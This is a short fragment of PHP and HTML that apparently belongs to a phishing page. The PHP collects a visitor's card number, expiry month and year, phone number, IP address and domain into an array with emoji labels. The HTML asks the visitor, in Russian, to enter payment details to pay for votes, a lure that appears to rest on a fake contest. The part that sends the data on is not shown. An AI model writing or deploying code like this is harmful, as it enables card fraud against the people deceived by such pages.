...
$arr = array(
  'Имя модели: ' => $_SESSION['name-model'],
  '🌐IP: ' => $ip,
  '📡domen'=>$domen,
  '💳Номер карты: ' => $cardnum,
  '💳Месяц: ' => $month, 
  '💳Год: ' => $year,
  'Номер телефона:' => $_SESSION['phonenumber']
...
<body>
    ...
    <div class="description">
        ...
        <table style="width:100%">
            <tr>
                <td> </td>
                <td style="text-align:center;"><label>Укажите реквизиты для оплаты голосов</label><label></label></td>
            </tr>
        </table>
    </div>
